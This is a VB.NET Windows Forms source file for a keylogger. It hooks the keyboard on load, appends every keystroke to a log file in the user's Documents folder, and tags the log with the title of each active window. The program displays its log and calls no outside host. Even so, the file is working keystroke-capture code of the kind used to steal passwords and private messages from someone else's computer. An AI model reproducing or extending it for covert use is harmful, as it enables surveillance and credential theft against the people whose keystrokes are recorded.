Imports System.IO
Imports Microsoft.Win32
Public Class Form1
    Dim WithEvents K As New Keyboard
    Private Declare Function GetForegroundWindow Lib "user32.dll" () As Int32
    Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Int32, lpstring As String, ByVal cch As Int32) As Int32
    Dim strin As String = Nothing
    Private save_dir As String = My.Computer.FileSystem.SpecialDirectories.MyDocuments & ".\Key Monitor"
    Private Sub K_Down(ByVal Key As String) Handles K.Down
        IO.File.AppendAllText(save_dir & ".\logs.txt", Key)
    End Sub
    Private Function GetActiveWindowTitle() As String
        Dim MyStr As String
        MyStr = New String(Chr(0), 100)
        GetWindowText(GetForegroundWindow, MyStr, 100)
        MyStr = MyStr.Substring(0, InStr(MyStr, Chr(0)) - 1)
        Return MyStr
    End Function
    'Hello there. Before you start, add 2 timer controls to this form. 
    'Make one 'timerKeys' and the other 'timerSave'
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        start_key_logger()
    End Sub
    Private Sub start_key_logger()
        TextBox1.Clear()
        TextBox1.Text = "---------- Key Monitoring Started ----------" & vbNewLine & Now & vbNewLine & "--------------------------------------------" & vbNewLine
        IO.File.AppendAllText(save_dir & ".\logs.txt", vbNewLine & TextBox1.Text)
        K.CreateHook()
        timerKeys.Start()
    End Sub
    Private Sub stop_key_logger()
        K.DiposeHook()
        timerKeys.Stop()
        IO.File.AppendAllText(save_dir & ".\logs.txt", vbNewLine & "---------- Key Monitoring Stopped ----------" & vbNewLine)
        TextBox1.Clear()
        TextBox1.Text = "Logs Saved To " & save_dir
    End Sub
    Private Sub timerKeys_Tick(sender As Object, e As EventArgs) Handles timerKeys.Tick
        If strin <> GetActiveWindowTitle() Then
            TextBox1.Text = TextBox1.Text + vbNewLine + "[" + GetActiveWindowTitle() + "]" + vbNewLine
            IO.File.AppendAllText(save_dir & ".\logs.txt", vbNewLine + "[" + GetActiveWindowTitle() + "]" + vbNewLine)
            strin = GetActiveWindowTitle()
        End If
    End Sub
    Private Sub timerSave_Tick(sender As Object, e As EventArgs) Handles timerSave.Tick
        If strin <> GetActiveWindowTitle() Then
            TextBox1.Text = TextBox1.Text + vbNewLine + GetActiveWindowTitle() + vbNewLine
            IO.File.AppendAllText(My.Computer.FileSystem.CurrentDirectory + "\log.txt", vbNewLine + "[" + GetActiveWindowTitle() + "]" + vbNewLine)
            strin = GetActiveWindowTitle()
        End If
        My.Computer.FileSystem.WriteAllText(save_dir & ".\logs.txt", TextBox1.Text, True)
    End Sub
End Class
